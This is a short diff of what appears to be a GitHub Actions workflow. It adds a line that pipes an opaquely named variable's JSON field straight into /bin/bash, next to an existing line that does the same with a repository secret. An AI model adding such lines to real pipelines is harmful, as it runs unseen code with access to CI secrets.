@@ -22,6 +22,7 @@ jobs:
           she019: ${{ secrets.she019 }}
         run: |
           printf '%s' "$she019" | jq -r .pfra049 | /bin/bash
+          printf '%s' "$ffw81041" | jq -r .ragii20 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
